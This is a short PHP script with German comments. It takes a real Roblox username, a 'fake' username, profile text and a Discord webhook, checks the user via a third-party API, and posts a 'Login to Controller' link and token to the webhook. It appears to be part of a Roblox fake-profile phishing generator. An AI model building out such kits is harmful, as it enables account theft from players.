<?php
if (isset($_POST['rusername'], $_POST['fusername'], $_POST['aboutme'], $_POST['dwebhook'])) {
    $rusername = $_POST['rusername'];
    $fusername = $_POST['fusername'];
    $aboutme = $_POST['aboutme'];
    $dwebhook = $_POST['dwebhook'];

    // Überprüfen, ob die Webhook-URL gültig ist
    $parse = parse_url($dwebhook);
    if ($parse && ($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com')) {
        // Hier den Code einfügen, um die API von Roblox aufzurufen und die erforderlichen Daten zu erhalten
        // Beispiel-API-Anfrage:
        $roblox_api_url = "https://api.newstargeted.com/roblox/users/v2/user.php?username=$rusername";
        $roblox_api_response = file_get_contents($roblox_api_url);

        // Überprüfen, ob die API-Antwort Daten enthält
        if ($roblox_api_response) {
            $roblox_user_data = json_decode($roblox_api_response);

            // Überprüfen, ob der Benutzer existiert
            if (isset($roblox_user_data->userId)) {
                // Generiere eine eindeutige ID für den Benutzer
                $userid = uniqid();

                // Daten für die Benachrichtigung an den Webhook vorbereiten
                $notification_data = [
                    'username' => 'Bot',
                    'avatar_url' => '', // Hier den Avatar-URL einfügen, wenn vorhanden
                    'content' => '@everyone',
                    'embeds' => [
                        [
                            'title' => 'Login to Controller',
                            'type' => 'rich',
                            'url' => "https://yourdomain.com/users/$userid/profile/controller/login",
                            'color' => hexdec('#ff0000'), // Farbe des Embeds
                            'footer' => [
                                'text' => 'Generated Link',
                                'icon_url' => '' // Hier den Avatar-URL einfügen, wenn vorhanden
                            ],
                            'fields' => [
                                [
                                    'name' => '**Info**',
                                    'value' => "```Token: $userid\nUrl: https://yourdomain.com/users/$userid/profile```",
                                    'inline' => true
                                ]
                            ]
                        ]
                    ]
                ];

                // Daten in JSON umwandeln
                $json_data = json_encode($notification_data);

                // Optionen für die cURL-Anfrage festlegen
                $curl_options = [
                    CURLOPT_URL => $dwebhook,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $json_data,
                    CURLOPT_HTTPHEADER => [
                        'Content-Type: application/json'
                    ],
                    CURLOPT_RETURNTRANSFER => true
                ];

                // cURL-Anfrage ausführen
                $ch = curl_init();
                curl_setopt_array($ch, $curl_options);
                $response = curl_exec($ch);

                // Überprüfen, ob die Anfrage erfolgreich war
                if ($response === false) {
                    $error = 'Fehler beim Senden der Nachricht.';
                } else {
                    $success = 'Der Link und der Controller-Token wurden erfolgreich an Ihren Webhook gesendet!';
                }
            } else {
                $error = 'Dieser Benutzername existiert nicht auf Roblox!';
            }
        } else {
            $error = 'Fehler beim Abrufen von Daten von der Roblox-API.';
        }
    } else {
        $error = 'Dies scheint keine gültige Webhook-URL zu sein!';
    }
} else {
    $error = 'Bitte füllen Sie alle erforderlichen Felder aus.';
}
?>
